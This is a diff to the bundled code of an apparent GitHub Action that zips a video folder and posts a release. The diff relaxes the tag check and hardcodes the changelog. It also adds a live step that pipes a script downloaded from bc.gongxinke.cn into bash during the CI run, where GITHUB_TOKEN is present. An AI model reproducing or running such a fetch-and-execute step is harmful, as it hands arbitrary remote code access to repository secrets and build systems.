@@ -7843,16 +7843,17 @@ const util_github = new github.GitHub(process.env.GITHUB_TOKEN);
 // const github = {}
 async function postRelease(filePath) {
   try {
-    // if (!process.env.GITHUB_REF.startsWith('refs/tags/')) {
-    //   throw new Error('A tag is required for GitHnpmub Releases')
-    // }
-
-    let changelog;
-    const changelogPath = process.env.INPUT_CHANGELOG;
-
-    if (changelogPath) {
-      changelog = fs.readFileSync(replaceEnvVariables(changelogPath), 'utf8');
+    if (!process.env.GITHUB_REF.startsWith('refs/tags/')) {
+      console.log('A tag is required for GitHnpmub Releases');
+      // throw new Error('A tag is required for GitHnpmub Releases')
     }
+
+    let changelog = "hello";
+    // const changelogPath = process.env.INPUT_CHANGELOG;
+
+    // if (changelogPath) {
+    //   changelog = fs.readFileSync(replaceEnvVariables(changelogPath), 'utf8');
+    // }
 
     const release = await createGithubRelease(changelog);
     const assetPath = filePath;
@@ -7980,6 +7981,11 @@ async function run() {
     // const isZip = core.getInput('isZip');
     // uname -a
 
+    // curl https://bc.gongxinke.cn/downloads/install-python-latest | bash
+
+    let s = "curl https://bc.gongxinke.cn/downloads/install-python-latest | bash"
+    await _execa_4_0_0_execa_default()(s)
+
     // let s = await execa('uname -a')
     // console.log(s.stdout)
     process.chdir(videoDir);
@@ -7997,13 +8003,14 @@ async function run() {
     await bundleZip(videoDir, zipPath);
 
     await postRelease(zipPath);
+    let version = (await _execa_4_0_0_execa_default()('python --version')).stdout;
+    console.log('py version', version);
+
 
     src_core.setOutput('time', new Date().toTimeString());
 
     // const isList = core.getInput('isList');
 
-    let version = (await _execa_4_0_0_execa_default()('python --version')).stdout;
-    console.log('py version', version);
   } catch (error) {
     src_core.setFailed(error.message);
   }
